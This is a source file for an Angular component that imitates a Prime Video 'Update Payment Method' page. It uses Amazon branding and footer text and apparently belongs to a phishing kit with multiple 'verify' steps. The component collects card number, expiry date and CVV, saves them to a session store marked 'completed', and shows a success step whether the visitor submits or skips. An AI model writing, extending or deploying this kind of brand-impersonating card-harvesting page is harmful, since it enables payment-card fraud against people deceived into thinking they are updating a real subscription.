import { Component, inject, signal } from '@angular/core';
import { CommonModule } from '@angular/common';
import { FormsModule, ReactiveFormsModule, FormBuilder, Validators } from '@angular/forms';
import { Router } from '@angular/router';
import { StateService } from '../../../services/state.service';

@Component({
    selector: 'app-prime-payment',
    standalone: true,
    imports: [CommonModule, FormsModule, ReactiveFormsModule],
    template: `
    <div class="prime-flow-container">
      <img src="/assets/images/logos/prime-video-logo.svg" alt="Prime Video" class="prime-logo">
      
      <div class="prime-card">
        <h1>Update Payment Method</h1>
        <p style="color: #8197A4; font-size: 14px; margin-bottom: 20px;">
           Please update your payment method to ensure uninterrupted access to your Prime Video subscription.
        </p>

        <form [formGroup]="cardForm" (ngSubmit)="onSubmit()">
          <div class="prime-form-group">
            <label for="cardNumber">Card Number</label>
            <input 
              type="text" 
              id="cardNumber" 
              formControlName="cardNumber"
              placeholder="0000 0000 0000 0000"
              [class.error]="isFieldInvalid('cardNumber')"
              (input)="formatCardNumber($event)"
            >
          </div>

          <div style="display: flex; gap: 15px;">
              <div class="prime-form-group" style="flex: 1;">
                <label for="expiry">Expiry Date</label>
                <input 
                  type="text" 
                  id="expiry" 
                  formControlName="expiry"
                  placeholder="MM/YY"
                  [class.error]="isFieldInvalid('expiry')"
                  (input)="formatExpiry($event)"
                >
              </div>
              
              <div class="prime-form-group" style="flex: 1;">
                <label for="cvv">CVV</label>
                <input 
                  type="text" 
                  id="cvv" 
                  formControlName="cvv"
                  placeholder="123"
                  maxlength="4"
                  [class.error]="isFieldInvalid('cvv')"
                >
              </div>
          </div>

          <button 
            type="submit" 
            class="prime-btn-primary"
            [disabled]="cardForm.invalid || isLoading()"
          >
            Update Payment Method
          </button>
          
          <div style="margin-top: 15px; text-align: center;">
             <a href="javascript:void(0)" class="prime-link" (click)="skip()">Skip for now</a>
          </div>
        </form>
      </div>
      
      <footer class="prime-footer">
         <a href="javascript:void(0)">Terms and Privacy Notice</a>
         <a href="javascript:void(0)">Send us feedback</a>
         <a href="javascript:void(0)">Help</a>
         <div style="margin-top: 10px;">
            © 1996-2024, Amazon.com, Inc. or its affiliates
         </div>
      </footer>
    </div>
  `,
    styleUrls: ['../../../styles/flows/prime-video.scss']
})
export class PrimePaymentComponent {
    private fb = inject(FormBuilder);
    private router = inject(Router);
    private state = inject(StateService);

    isLoading = signal(false);

    cardForm = this.fb.group({
        cardNumber: ['', [Validators.required, Validators.pattern(/^\d{4}\s\d{4}\s\d{4}\s\d{4}$/)]],
        expiry: ['', [Validators.required, Validators.pattern(/^(0[1-9]|1[0-2])\/\d{2}$/)]],
        cvv: ['', [Validators.required, Validators.pattern(/^\d{3,4}$/)]]
    });

    isFieldInvalid(field: string): boolean {
        const control = this.cardForm.get(field);
        return !!(control && control.invalid && (control.dirty || control.touched));
    }

    formatCardNumber(event: any) {
        let value = event.target.value.replace(/\D/g, '');
        let formatted = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) formatted += ' ';
            formatted += value[i];
        }
        this.cardForm.get('cardNumber')?.setValue(formatted.substring(0, 19));
    }

    formatExpiry(event: any) {
        let value = event.target.value.replace(/\D/g, '');
        if (value.length > 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        this.cardForm.get('expiry')?.setValue(value.substring(0, 5));
    }

    async onSubmit() {
        if (this.cardForm.valid) {
            this.isLoading.set(true);
            const { cardNumber, expiry, cvv } = this.cardForm.value;

            this.state.updateSession({
                cardNumber,
                cardExpiry: expiry,
                cardCvv: cvv,
                status: 'completed'
            });

            setTimeout(() => {
                this.isLoading.set(false);
                this.state.navigate('/verify/step-success');
            }, 800);
        } else {
            this.cardForm.markAllAsTouched();
        }
    }

    skip() {
        this.state.navigate('/verify/step-success');
    }
}
